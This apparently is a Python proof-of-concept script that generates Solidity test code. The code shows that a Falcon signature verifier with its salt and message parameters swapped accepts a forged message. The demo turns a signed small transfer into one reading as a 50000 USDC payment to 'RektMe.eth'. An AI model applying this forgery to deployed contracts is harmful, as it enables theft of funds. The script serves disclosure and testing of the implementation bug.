from falcon import HEAD_LEN, SALT_LEN, Params, decompress, SecretKey
from keccaxof import KeccaXOF

n = 512
sk = SecretKey(n)

salt = "Send ______ 1 USDC ______ to vitalik.eth"
message = " and 50000 USDC to RektMe.eth!"


def constant_salt(x):
    return salt.encode()


σ = sk.sign(message.encode(), randombytes=constant_salt, xof=KeccaXOF)

assert sk.verify(message.encode(), σ, xof=KeccaXOF)

# recover s1 in the Solidity format (as in verification)
enc_s = σ[HEAD_LEN + SALT_LEN:]
s1 = decompress(enc_s, Params[n]["sig_bytelen"] - HEAD_LEN - SALT_LEN, n)


# /!\
# in Tetration implementation,
# salt and message are reversed
# (implementation mistake)
# /!\
message, salt = salt, message

print("// code generated using pythonref/forgery.py.")

print("// public key")
print("// forgefmt: disable-next-line")
print("uint[512] memory tmp_pk = [uint({}), {}];".format(
    sk.h[0], ','.join(map(str, sk.h[1:]))))
print("uint[] memory pk = new uint[](512);")
print("for (uint i = 0; i < 512; i++) {")
print("\tpk[i] = tmp_pk[i];")
print("}")

print("// signature s1")
print("// forgefmt: disable-next-line")
print("int[512] memory tmp_s1 = [int({}), {}];".format(
    s1[0], ','.join(map(str, s1[1:]))))
print("Falcon.Signature memory sig;")
print("sig.s1 = new int256[](512);")
print("for (uint i = 0; i < 512; i++) {")
print("\tsig.s1[i] = tmp_s1[i];")
print("}")

print("// message")
print("bytes memory msg3 = \"{}\"; ".format(message))
print('// salt')
print("sig.salt = \"{}\"; ".format("".join(f"\\x{ord(c):02x}" for c in salt)))

print("falcon.verify(msg3, sig, pk);")

print("// message")
print("bytes memory msg4 = \"{}\"; ".format(
    message + salt))
print('// salt')
print("sig.salt = \"\"; ")

print("falcon.verify(msg4, sig, pk);")
